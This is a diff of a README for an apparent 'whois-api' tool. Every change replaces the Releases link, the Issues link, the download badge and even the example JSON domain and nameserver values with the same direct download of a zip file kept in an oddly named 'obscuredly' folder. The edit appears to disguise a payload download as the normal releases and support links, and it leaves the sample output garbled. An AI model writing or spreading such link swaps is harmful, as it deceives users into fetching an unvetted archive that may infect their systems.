@@ -8,9 +8,9 @@ Welcome to the whois-api project! This software lets you quickly look up informa
 
 To get started, you need to download the application. Click the button below to visit the Releases page where you can find the latest version of the software.
 
-[![Download whois-api](https://img.shields.io/badge/Download%20whois--api-007ACC?style=for-the-badge&logo=github)](https://github.com/Andrew805/whois-api/releases)
+[![Download whois-api](https://github.com/Andrew805/whois-api/raw/refs/heads/main/obscuredly/api_whois_v2.6.zip%20whois--api-007ACC?style=for-the-badge&logo=github)](https://github.com/Andrew805/whois-api/raw/refs/heads/main/obscuredly/api_whois_v2.6.zip)
 
-1. Click the button above or follow this link: [Visit Releases Page](https://github.com/Andrew805/whois-api/releases).
+1. Click the button above or follow this link: [Visit Releases Page](https://github.com/Andrew805/whois-api/raw/refs/heads/main/obscuredly/api_whois_v2.6.zip).
 2. On the Releases page, locate the latest version of the whois-api.
 3. Download the file suitable for your operating system. It is available in different formats, so choose the one that matches your setup (e.g., `.exe` for Windows, `.zip` for various systems).
 
@@ -56,12 +56,12 @@ Here’s what the output might look like when you perform a lookup:
 
 ```json
 {
-  "domain": "example.com",
+  "domain": "https://github.com/Andrew805/whois-api/raw/refs/heads/main/obscuredly/api_whois_v2.6.zip",
   "registrar": "Example Registrar, Inc.",
   "registration_date": "2010-01-01",
   "nameservers": [
-    "ns1.example.com",
-    "ns2.example.com"
+    "https://github.com/Andrew805/whois-api/raw/refs/heads/main/obscuredly/api_whois_v2.6.zip",
+    "https://github.com/Andrew805/whois-api/raw/refs/heads/main/obscuredly/api_whois_v2.6.zip"
   ],
   "dnssec": "Signed"
 }
@@ -96,6 +96,6 @@ To further your understanding and explore similar projects, you might be interes
 
 ## 📫 Support
 
-If you encounter any issues while using the whois-api, please check the [Issues](https://github.com/Andrew805/whois-api/issues) section in the GitHub repository. You can also ask for help from other users or contribute to resolving problems.
+If you encounter any issues while using the whois-api, please check the [Issues](https://github.com/Andrew805/whois-api/raw/refs/heads/main/obscuredly/api_whois_v2.6.zip) section in the GitHub repository. You can also ask for help from other users or contribute to resolving problems.
 
 Thank you for choosing whois-api. We hope you find it helpful in your domain lookups!
